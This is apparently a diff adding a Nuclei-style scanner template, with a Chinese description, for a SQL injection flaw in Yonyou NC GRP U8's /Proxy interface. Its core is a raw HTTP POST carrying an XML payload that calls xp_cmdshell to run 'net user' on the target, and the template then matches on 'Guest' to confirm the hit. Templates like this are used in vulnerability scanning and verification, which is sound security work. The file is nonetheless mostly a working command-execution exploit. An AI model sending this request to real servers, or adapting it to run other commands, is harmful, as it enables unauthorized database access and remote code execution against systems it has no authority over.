@@ -1,0 +1,24 @@
+id: yonyou-nc-grp-sql-injection
+
+info:
+  name: "用友OA nc GRP u8前台接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    用友nc系统在GRP u8模块的前台接口中存在SQL注入安全缺陷，攻击者可通过构造恶意SQL查询实现对数据库的未授权访问，导致敏感数据泄露风险。
+  tags: 用友
+
+http:
+- raw:
+  - |
+    POST /Proxy HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "net user"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Guest'
